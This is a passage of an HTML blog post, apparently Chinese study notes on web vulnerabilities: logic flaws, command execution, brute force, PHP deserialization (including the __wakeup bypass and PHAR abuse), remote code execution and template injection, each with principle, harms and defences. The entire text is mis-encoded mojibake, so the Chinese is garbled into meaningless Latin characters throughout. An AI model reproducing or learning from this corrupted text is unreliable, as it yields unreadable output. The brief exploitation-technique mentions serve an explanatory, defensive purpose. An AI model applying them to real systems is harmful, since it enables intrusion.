¼å®šä¹‰ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼ŒåŒ…å«å…¶ä»–æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´äº†æ‰§è¡Œéé¢„æœŸä»£ç </strong></u>ã€‚</p><h3 id="2-å±å®³-6"><a href="#2-å±å®³-6" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote><p>â‘ è·å–æ•æ„Ÿä¿¡æ¯<br>â‘¡æ‰§è¡Œä»»æ„å‘½ä»¤<br>â‘¢è·å–æœåŠ¡å™¨æƒé™</p></blockquote><h3 id="3-é˜²å¾¡-6"><a href="#3-é˜²å¾¡-6" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote><p>â‘ å»ºè®®ç™½åå•ã€‚<br>â‘¡æŒ‡å®šè®¿é—®ä¸€å®šçš„è·¯å¾„ï¼Œå†å°†å‚æ•°æ‹¼æ¥åˆ°è·¯å¾„å½“ä¸­ã€‚</p></blockquote><hr><h2 id="å…«ã€logic-loopholeæ¼æ´ç¯‡"><a href="#å…«ã€logic-loopholeæ¼æ´ç¯‡" class="headerlink" title="å…«ã€logic loopholeæ¼æ´ç¯‡"></a>å…«ã€logic loopholeæ¼æ´ç¯‡</h2><h3 id="1-logic-loopholeæ¼æ´åŸç†"><a href="#1-logic-loopholeæ¼æ´åŸç†" class="headerlink" title="1.logic loopholeæ¼æ´åŸç†"></a>1.logic loopholeæ¼æ´åŸç†</h3><p>æŒ‡æ”»å‡»è€…<u><strong>åˆ©ç”¨ä¸šåŠ¡çš„è®¾è®¡ç¼ºé™·ï¼Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–ç ´åä¸šåŠ¡çš„å®Œæ•´æ€§</strong></u>ã€‚ä¸€èˆ¬å‡ºç°åœ¨<u><strong>å¯†ç ä¿®æ”¹ã€è¶Šæƒè®¿é—®ã€å¯†ç æ‰¾å›ã€äº¤æ˜“æ”¯ä»˜</strong></u>ç­‰åŠŸèƒ½å¤„ã€‚</p><h3 id="2-å±å®³-7"><a href="#2-å±å®³-7" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><p>ä»»æ„å¯†ç ä¿®æ”¹ã€è¶Šæƒè®¿é—®ã€å¯†ç ä»»æ„æ‰¾å›ã€äº¤æ˜“æ”¯ä»˜é‡‘é¢ä»»æ„ä¿®æ”¹ç­‰</p><h3 id="3-é˜²å¾¡-7"><a href="#3-é˜²å¾¡-7" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><h4 id="1-ä»»æ„å¯†ç ä¿®æ”¹"><a href="#1-ä»»æ„å¯†ç ä¿®æ”¹" class="headerlink" title="1.ä»»æ„å¯†ç ä¿®æ”¹"></a>1.ä»»æ„å¯†ç ä¿®æ”¹</h4><h4 id="2-è¶Šæƒè®¿é—®"><a href="#2-è¶Šæƒè®¿é—®" class="headerlink" title="2.è¶Šæƒè®¿é—®"></a>2.è¶Šæƒè®¿é—®</h4><p>è¶Šæƒè®¿é—®æ¼æ´äº§ç”Ÿ<u><strong>ä¸»è¦åŸå› æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·çš„èº«ä»½åšåˆ¤æ–­å’Œæ§åˆ¶</strong></u>ï¼Œé˜²èŒƒè¿™ç§æ¼æ´æ—¶ï¼Œå¯ä»¥é€šè¿‡sessionæ¥æ§åˆ¶ã€‚</p><p>ä¾‹å¦‚ï¼Œåœ¨ç”¨æˆ·ç™»å½•æ—¶ï¼Œå°†usernameæˆ–uidå†™å…¥åˆ°<code>session</code><u><strong><code>ï¼ˆä¼šè¯æ§åˆ¶ï¼ŒSessionå¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚è¿™æ ·ï¼Œå½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºçš„Webé¡µä¹‹é—´è·³è½¬æ—¶ï¼Œå­˜å‚¨åœ¨Sessionå¯¹è±¡ä¸­çš„å˜é‡å°†ä¸ä¼šä¸¢å¤±ï¼Œè€Œæ˜¯åœ¨æ•´ä¸ªç”¨æˆ·ä¼šè¯ä¸­ä¸€ç›´å­˜åœ¨ä¸‹å»ã€‚ï¼‰</code></strong></u>ä¸­å–å‡ºä¿¡æ¯ï¼Œ<u><strong><code>è€Œä¸æ˜¯ä»GETæˆ–POSTå–å‡ºusername</code></strong></u>ï¼Œnameæ­¤æ—¶å–åˆ°çš„usernameå°±æ˜¯æ²¡æœ‰ç¯¡æ”¹çš„ã€‚</p><hr><h2 id="ä¹ã€command-executionæ¼æ´ç¯‡"><a href="#ä¹ã€command-executionæ¼æ´ç¯‡" class="headerlink" title="ä¹ã€command executionæ¼æ´ç¯‡"></a>ä¹ã€command executionæ¼æ´ç¯‡</h2><h3 id="1-command-executionæ¼æ´åŸç†"><a href="#1-command-executionæ¼æ´åŸç†" class="headerlink" title="1.command executionæ¼æ´åŸç†"></a>1.command executionæ¼æ´åŸç†</h3><p>åº”ç”¨æœªå¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼çš„æ£€æŸ¥è¿‡æ»¤ï¼Œå¯¼è‡´ç”¨æˆ·<u><strong>è¾“å…¥çš„å‚æ•°è¢«å½“æˆå‘½ä»¤æ¥æ‰§è¡Œ</strong></u>ã€‚æ”»å‡»è€…å¯ä»¥ä»»æ„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå±äºé«˜å±æ¼æ´ä¹‹ä¸€ï¼Œä¹Ÿå±äºä»£ç æ‰§è¡Œçš„èŒƒç•´ã€‚</p><h3 id="2-å±å®³-8"><a href="#2-å±å®³-8" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote><p>â‘ ç»§æ‰¿webæœåŠ¡ç¨‹åºçš„æƒé™å»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–è¯»å†™æ–‡ä»¶ã€‚<br>â‘¡åå¼¹shellï¼Œè·å¾—ç›®æ ‡æœåŠ¡å™¨çš„æƒé™ã€‚<br>â‘¢è¿›ä¸€æ­¥å†…ç½‘æ¸—é€ã€‚</p></blockquote><h3 id="3-é˜²å¾¡-8"><a href="#3-é˜²å¾¡-8" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote><p>â‘ å°½é‡ä¸è¦ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°ã€‚<br>â‘¡å®¢æˆ·ç«¯<u><strong>æäº¤çš„å˜é‡åœ¨è¿›å…¥æ‰§è¡Œå‘½ä»¤å‡½æ•°å‰</strong></u>è¦åšå¥½<u><strong>è¿‡æ»¤å’Œæ£€æµ‹</strong></u>ã€‚<br>â‘¢åœ¨<u><strong>ä½¿ç”¨åŠ¨æ€å‡½æ•°ä¹‹å‰</strong></u>ï¼Œç¡®ä¿ä½¿ç”¨å‡½æ•°æ˜¯<u><strong>æŒ‡å®šçš„å‡½æ•°</strong></u>ä¹‹ä¸€ã€‚<u><strong>ã€é˜²æ­¢æ”»å‡»è€…å¼•å…¥æ–°å‡½æ•°ï¼ˆéç½‘ç«™ä½¿ç”¨çš„å‡½æ•°ï¼‰æ‰§è¡Œæ”»å‡»è¯­å¥ã€‘</strong></u><br>â‘£å¯¹<u><strong>phpè¯­è¨€</strong></u>è€Œè¨€ï¼Œ<u><strong>ä¸èƒ½å®Œå…¨æ§åˆ¶çš„å±é™©å‡½æ•°æœ€å¥½ä¸è¦ä½¿ç”¨</strong></u>ã€‚</p></blockquote><hr><h2 id="åã€brute-forceç¯‡"><a href="#åã€brute-forceç¯‡" class="headerlink" title="åã€brute forceç¯‡"></a>åã€brute forceç¯‡</h2><h3 id="1-brute-forceåŸç†"><a href="#1-brute-forceåŸç†" class="headerlink" title="1.brute forceåŸç†"></a>1.brute forceåŸç†</h3><p>ç”±äºæœåŠ¡å™¨ç«¯æ²¡æœ‰åšé™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æš´åŠ›æ‰‹æ®µç ´è§£æ‰€éœ€ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·åã€å¯†ç ã€éªŒè¯ç ç­‰ã€‚æš´åŠ›ç ´è§£éœ€è¦ä¸€ä¸ªå¼ºå¤§çš„å­—å…¸ï¼Œå¦‚4ä½æ•°å­—çš„éªŒè¯ç ï¼Œé‚£ä¹ˆæš´åŠ›ç ´è§£çš„èŒƒå›´å°±æ˜¯0000~9999ï¼Œ<u><strong>æš´åŠ›ç ´è§£çš„å…³é”®åœ¨äºå­—å…¸çš„å¤§å°</strong></u>ã€‚</p><h3 id="2-å±å®³-9"><a href="#2-å±å®³-9" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote><p>â‘ ç”¨æˆ·å¯†ç è¢«é‡ç½®ã€‚<br>â‘¡æ•æ„Ÿç›®å½•ã€å‚æ•°è¢«æšä¸¾ã€‚<br>â‘¢ç”¨æˆ·è®¢å•è¢«æšä¸¾ã€‚</p></blockquote><h3 id="3-é˜²å¾¡-9"><a href="#3-é˜²å¾¡-9" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote><p>â‘  å¦‚æœ<u><strong>ç”¨æˆ·ç™»å½•æ¬¡æ•°è¶…è¿‡è®¾ç½®çš„é˜ˆå€¼</strong></u>ï¼Œåˆ™<u><strong>é”å®šè´¦å·</strong></u>ã€‚<br>â‘¡ å¦‚æœ<u><strong>æŸä¸ªIPç™»é™†æ¬¡æ•°è¶…è¿‡è®¾ç½®çš„é˜ˆå€¼ï¼Œåˆ™é”å®šIP</strong></u>ã€‚ä½†<u><em><strong>å­˜åœ¨ä¸€ä¸ªé—®é¢˜</strong></em></u>ï¼Œå¦‚æœ<u><strong>å¤šä¸ªç”¨æˆ·ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªIPï¼Œåˆ™ä¼šé€ æˆå…¶ä»–ç”¨æˆ·ä¹Ÿä¸èƒ½ç™»å½•ã€‚</strong></u></p></blockquote><hr><h2 id="åä¸€ã€Deserialization-Vulnerabilitiesï¼ˆPHPï¼‰"><a href="#åä¸€ã€Deserialization-Vulnerabilitiesï¼ˆPHPï¼‰" class="headerlink" title="åä¸€ã€Deserialization Vulnerabilitiesï¼ˆPHPï¼‰"></a>åä¸€ã€Deserialization Vulnerabilitiesï¼ˆPHPï¼‰</h2><h3 id="1-Deserialization-Vulnerabilitiesæ¼æ´åŸç†"><a href="#1-Deserialization-Vulnerabilitiesæ¼æ´åŸç†" class="headerlink" title="1.Deserialization Vulnerabilitiesæ¼æ´åŸç†"></a>1.Deserialization Vulnerabilitiesæ¼æ´åŸç†</h3><p>PHPååºåˆ—åŒ–æ¼æ´ä¹Ÿå«PHPå¯¹è±¡æ³¨å…¥ï¼Œæ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„æ¼æ´ï¼Œè¿™ç§ç±»å‹çš„æ¼æ´è™½ç„¶æœ‰äº›éš¾ä»¥åˆ©ç”¨ï¼Œä½†ä¸€æ—¦åˆ©ç”¨æˆåŠŸå°±ä¼šé€ æˆéå¸¸å±é™©çš„åæœã€‚</p><p>æ¼æ´çš„å½¢æˆçš„<u><strong>æ ¹æœ¬åŸå› æ˜¯ç¨‹åºæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´ååºåˆ—åŒ–è¿‡ç¨‹å¯ä»¥è¢«æ¶æ„æ§åˆ¶ï¼Œè¿›è€Œé€ æˆä»£ç æ‰§è¡Œã€getshellç­‰ä¸€ç³»åˆ—ä¸å¯æ§çš„åæœ</strong></u>ã€‚ååºåˆ—åŒ–æ¼æ´å¹¶ä¸æ˜¯PHPç‰¹æœ‰ï¼Œ<u><strong>ä¹Ÿå­˜åœ¨äºJavaã€Pythonç­‰è¯­è¨€</strong></u>ä¹‹ä¸­ï¼Œä½†å…¶åŸç†åŸºæœ¬ç›¸é€šã€‚</p><p>PHPç±»éƒ½å«æœ‰å‡ ä¸ªç‰¹å®šçš„å…ƒç´ : ç±»å±æ€§ã€ç±»å¸¸é‡ã€ç±»æ–¹æ³•ã€‚æ¯ä¸€ä¸ªç±»è‡³å°‘éƒ½å«æœ‰ä»¥ä¸Šä¸‰ä¸ªå…ƒç´ ï¼Œè€Œè¿™ä¸‰ä¸ªå…ƒç´ ä¹Ÿå¯ä»¥ç»„æˆæœ€åŸºæœ¬çš„ç±»ã€‚é‚£ä¹ˆæŒ‰ç…§ç‰¹å®šçš„æ ¼å¼å°†è¿™ä¸‰ä¸ªå…ƒç´ è¡¨è¾¾å‡ºæ¥å°±å¯ä»¥å°†ä¸€ä¸ªå®Œæ•´çš„ç±»è¡¨ç¤ºå‡ºæ¥å¹¶ä¼ é€’ã€‚</p><p><u>åºåˆ—åŒ–å°±æ˜¯å°†ä¸€ä¸ª<strong>ç±»</strong>å‹ç¼©æˆä¸€ä¸ªå­—ç¬¦ä¸²çš„æ–¹æ³•</u></p><h3 id="2-å±å®³-10"><a href="#2-å±å®³-10" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><p><u><strong>æœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹</strong></u>ï¼Œå¯¼è‡´<u><strong>æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹</strong></u>ï¼Œä»è€Œ<u><strong>å¯¼è‡´ä»£ç æ‰§è¡Œï¼ŒSQLæ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœ</strong></u>ã€‚åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è‡ªåŠ¨è§¦å‘äº†æŸäº›é­”æœ¯æ–¹æ³•ã€‚</p><h3 id="3-é˜²å¾¡-10"><a href="#3-é˜²å¾¡-10" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><h4 id="1-ç­¾åä¸è®¤è¯"><a href="#1-ç­¾åä¸è®¤è¯" class="headerlink" title="1)ç­¾åä¸è®¤è¯"></a>1)ç­¾åä¸è®¤è¯</h4><p>å¦‚æœåºåˆ—åŒ–çš„å†…å®¹æ²¡æœ‰ç”¨æˆ·å¯æ§å‚æ•°ï¼Œä»…ä»…æ˜¯æœåŠ¡ç«¯å­˜å‚¨å’Œåº”ç”¨ï¼Œåˆ™å¯ä»¥é€šè¿‡ç­¾åè®¤è¯ï¼Œæ¥é¿å…åº”ç”¨æ¥å—é»‘å®¢çš„å¼‚å¸¸è¾“å…¥ã€‚   </p><h4 id="2-é™åˆ¶åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»"><a href="#2-é™åˆ¶åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»" class="headerlink" title="2)é™åˆ¶åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»"></a>2)é™åˆ¶åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»</h4><p>å¢åŠ ä¸€å±‚åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¥å£ç±»ã€‚è¿™å°±ç›¸å½“äºå…è®¸æä¾›äº†ä¸€ä¸ªç™½åå•çš„è¿‡æ»¤ï¼šåªå…è®¸æŸäº›ç±»å¯ä»¥è¢«ååºåˆ—åŒ–ã€‚åªè¦ä½ åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œé¿å…æ¥å—å¤„ç†ä»»ä½•ç±»å‹ï¼ˆåŒ…æ‹¬ç±»æˆå‘˜ä¸­çš„æ¥å£ã€æ³›å‹ç­‰ï¼‰ï¼Œé»‘å®¢å…¶å®å¾ˆéš¾æ§åˆ¶åº”ç”¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰€ä½¿ç”¨çš„ç±»ï¼Œä¹Ÿå°±æ²¡æœ‰åŠæ³•æ„é€ å‡ºè°ƒç”¨é“¾ï¼Œè‡ªç„¶ä¹Ÿå°±å¾ˆéš¾åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´äº†</p><h4 id="3-RASPæ£€æµ‹"><a href="#3-RASPæ£€æµ‹" class="headerlink" title="3)RASPæ£€æµ‹"></a>3)RASPæ£€æµ‹</h4><p>ï¼ˆ<code>Runtime Application Self-Protection</code>ï¼Œå®æ—¶ç¨‹åºè‡ªæˆ‘ä¿æŠ¤ï¼‰ã€‚RASP é€šè¿‡ hook ç­‰æ–¹å¼ï¼Œåœ¨è¿™äº›å…³é”®å‡½æ•°ï¼ˆä¾‹å¦‚ï¼šåºåˆ—åŒ–ï¼Œååºåˆ—åŒ–)çš„è°ƒç”¨ä¸­ï¼Œå¢åŠ ä¸€é“è§„åˆ™çš„æ£€æµ‹ã€‚è¿™ä¸ªè§„åˆ™ä¼šåˆ¤æ–­åº”ç”¨æ˜¯å¦æ‰§è¡Œäº†éåº”ç”¨æœ¬èº«çš„é€»è¾‘ï¼Œèƒ½å¤Ÿåœ¨ä¸ä¿®æ”¹ä»£ç çš„æƒ…å†µä¸‹å¯¹ååºåˆ—åŒ–æ¼æ´æ”»å‡»å®ç°æ‹¦æˆª.</p><h3 id="4-åˆ©ç”¨"><a href="#4-åˆ©ç”¨" class="headerlink" title="4.åˆ©ç”¨"></a>4.åˆ©ç”¨</h3><h4 id="1-wakeup-ç»•è¿‡"><a href="#1-wakeup-ç»•è¿‡" class="headerlink" title="1)__wakeup( )ç»•è¿‡"></a>1)__wakeup( )ç»•è¿‡</h4><p><code>(CVE-2016-7124)</code></p><p>ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœè¡¨ç¤ºå¯¹è±¡<code>å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°</code>æ—¶å°±ä¼š<code>è·³è¿‡__wakeup( )çš„æ‰§è¡Œ</code>ã€‚</p><h4 id="2-æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•"><a href="#2-æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•" class="headerlink" title="2)æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•"></a>2)æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•</h4><p>å½“ç›®æ ‡å¯¹è±¡è¢«<code>privateã€protectedä¿®é¥°æ—¶çš„æ„é€ æ–¹æ³•</code>ã€‚</p><h4 id="3-Sessionååºåˆ—åŒ–æ¼æ´"><a href="#3-Sessionååºåˆ—åŒ–æ¼æ´" class="headerlink" title="3)Sessionååºåˆ—åŒ–æ¼æ´"></a>3)Sessionååºåˆ—åŒ–æ¼æ´</h4><p>PHPä¸­çš„<code>Sessionç»åºåˆ—åŒ–åå­˜å‚¨ï¼Œè¯»å–æ—¶å†è¿›è¡Œååºåˆ—åŒ–</code>ã€‚</p><h4 id="4-PHARåˆ©ç”¨"><a href="#4-PHARåˆ©ç”¨" class="headerlink" title="4)PHARåˆ©ç”¨"></a>4)PHARåˆ©ç”¨</h4><p>PHAR (â€œPhp ARchiveâ€) æ˜¯PHPé‡Œç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ï¼Œåœ¨PHP 5.3 æˆ–æ›´é«˜ç‰ˆæœ¬ä¸­é»˜è®¤å¼€å¯ï¼Œè¿™ä¸ªç‰¹æ€§ä½¿å¾— PHPä¹Ÿå¯ä»¥åƒ Java ä¸€æ ·æ–¹ä¾¿åœ°å®ç°åº”ç”¨ç¨‹åºæ‰“åŒ…å’Œç»„ä»¶åŒ–ã€‚ä¸€ä¸ªåº”ç”¨ç¨‹åºå¯ä»¥æ‰“æˆä¸€ä¸ª Phar åŒ…ï¼Œç›´æ¥æ”¾åˆ° PHP-FPM ä¸­è¿è¡Œã€‚</p><hr><h2 id="åäºŒã€rceæ¼æ´ç¯‡"><a href="#åäºŒã€rceæ¼æ´ç¯‡" class="headerlink" title="åäºŒã€rceæ¼æ´ç¯‡"></a>åäºŒã€rceæ¼æ´ç¯‡</h2><h3 id="1-rceæ¼æ´åŸç†"><a href="#1-rceæ¼æ´åŸç†" class="headerlink" title="1.rceæ¼æ´åŸç†"></a>1.rceæ¼æ´åŸç†</h3><p>ä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿ<u><strong>ä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£</strong></u>ã€‚æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Šã€‚ä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚ å¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œ<u><strong>æ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼š<code>å¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤</code>ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨</strong></u>ã€‚ ç°åœ¨å¾ˆå¤šçš„ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´,å¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡â€è‡ªåŠ¨åŒ–è¿ç»´å¹³å°â€è¿›è¡Œæ“ä½œã€‚åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´ã€‚ è¿œç¨‹ä»£ç æ‰§è¡Œ åŒæ ·çš„é“ç†,å› ä¸ºéœ€æ±‚è®¾è®¡,åå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°,è¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚ </p><blockquote><p>å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™<u><strong>å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼ˆä¸€èˆ¬æŒ‡åº”ç”¨ç¨‹åºçš„ç¼–ç¨‹æ¥å£ï¼Œä¸»è¦ç›®çš„æ˜¯æä¾›åº”ç”¨ç¨‹åºä¸å¼€å‘äººå‘˜ä»¥è®¿é—®ä¸€ç»„ä¾‹ç¨‹çš„èƒ½åŠ›ï¼Œè€Œåˆæ— éœ€è®¿é—®æºç ï¼Œæˆ–ç†è§£å†…éƒ¨å·¥ä½œæœºåˆ¶çš„ç»†èŠ‚ï¼‰ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­</strong></u>ï¼Œæ¯”å¦‚<code>å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥</code>ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚</p></blockquote><h3 id="2-å±å®³-11"><a href="#2-å±å®³-11" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><p>RCEæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥<u><strong>æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç </strong></u>ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚</p><h3 id="3-é˜²å¾¡-11"><a href="#3-é˜²å¾¡-11" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote><p>1)å°½é‡ä¸è¦ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°ã€‚</p><p>2)ä¸è¦è®©ç”¨æˆ·æ§åˆ¶å‚æ•°ã€‚</p><p>3)æ‰§è¡Œå‰åšå¥½æ£€æµ‹å’Œè¿‡æ»¤ã€‚</p></blockquote><hr><h2 id="åä¸‰ã€sstiæ¼æ´ç¯‡"><a href="#åä¸‰ã€sstiæ¼æ´ç¯‡" class="headerlink" title="åä¸‰ã€sstiæ¼æ´ç¯‡"></a>åä¸‰ã€sstiæ¼æ´ç¯‡</h2><h3 id="1-sstiæ¼æ´åŸç†"><a href="#1-sstiæ¼æ´åŸç†" class="headerlink" title="1.sstiæ¼æ´åŸç†"></a>1.sstiæ¼æ´åŸç†</h3><p><a href="https://xz.aliyun.com/t/3679#toc-0">æ¨èæ–‡ç« </a></p><p>SSTIæ˜¯ä¸€ç§æ³¨å…¥ç±»çš„æ¼æ´ï¼Œå…¶<code>æˆå› ä¹Ÿå¯ä»¥ç±»æ¯”SQLæ³¨å…¥</code><br>SQLæ³¨å…¥æ˜¯ä»ç”¨æˆ·è·å¾—ä¸€ä¸ªè¾“å…¥ï¼Œç„¶åç”¨åç«¯è„šæœ¬è¯­è¨€è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œåˆ©ç”¨è¾“å…¥æ¥æ‹¼æ¥æˆ‘ä»¬æƒ³è¦çš„SQLè¯­å¥ã€‚SSTIä¹Ÿæ˜¯è·å–ä¸€ä¸ªè¾“å…¥ï¼Œç„¶ååœ¨åç«¯çš„æ¸²æŸ“å¤„ç†ä¸Šè¿›è¡Œè¯­å¥çš„æ‹¼æ¥æ‰§è¡Œã€‚ä½†æ˜¯å’ŒSQLæ³¨å…¥ä¸åŒçš„ï¼Œ</p><p>SSTIåˆ©ç”¨çš„æ˜¯ç°æœ‰çš„ç½‘ç«™æ¨¡æ¿å¼•æ“ï¼Œä¸»è¦é’ˆå¯¹Pythonã€PHPã€JAVAçš„ä¸€äº›ç½‘ç«™å¤„ç†æ¡†æ¶ï¼Œæ¯”å¦‚Pythonçš„<strong>jinja2ã€makoã€tornadoã€Django</strong>ï¼ŒPHPçš„<strong>smarty twig</strong>ï¼Œjavaçš„<strong>jade velocity</strong>ã€‚å½“è¿™äº›æ¡†æ¶å¯¹è¿ç”¨æ¸²æŸ“å‡½æ•°ç”Ÿæˆhtmlçš„æ—¶å€™ï¼Œåœ¨è¿‡æ»¤ä¸ä¸¥æƒ…å†µä¸‹ï¼Œé€šè¿‡æ„é€ æ¶æ„è¾“å…¥æ•°æ®ï¼Œä»è€Œè¾¾åˆ°getshellæˆ–å…¶ä»–ç›®çš„ã€‚</p><blockquote><p><code>ä¸€å¥è¯å°±æ˜¯æœåŠ¡ç«¯åœ¨æ¥æ”¶ç”¨æˆ·è¾“å…¥æˆ–ç”¨æˆ·å¯æ§å‚æ•°åï¼Œæœªä½œå¤„ç†æˆ–æœªè¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œç›´æ¥åµŒå…¥æ¨¡æ¿æ¸²æŸ“ï¼Œå¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç </code></p></blockquote><p><strong>æ¨¡æ¿æ³¨å…¥</strong>æ¶‰åŠçš„æ˜¯æœåŠ¡ç«¯Webåº”ç”¨ä½¿ç”¨æ¨¡æ¿å¼•æ“<strong>æ¸²æŸ“ç”¨æˆ·è¯·æ±‚çš„è¿‡ç¨‹</strong>ï¼Œ<br> æœåŠ¡ç«¯æŠŠ<strong>ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ¸²æŸ“æˆæ¨¡æ¿</strong>å°±å¯èƒ½é€ æˆSSTI(Server-Side Template Injection)</p><p>æ¨¡æ¿æ¸²æŸ“æ¥å—çš„å‚æ•°éœ€è¦ç”¨ä¸¤ä¸ªå¤§æ‹¬å·<code>&#123;  &#123;&#125;  &#125;</code>æ‹¬èµ·æ¥</p><h3 id="2-å±å®³-12"><a href="#2-å±å®³-12" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><p>æ”»å‡»è€…åœ¨æœåŠ¡å™¨è¾“å…¥è¯­å¥ï¼ŒæœåŠ¡ç«¯å°†å…¶<u><strong>ä½œä¸ºWebåº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†</strong></u>ï¼Œåœ¨è¿›è¡Œ<u><strong>ç›®æ 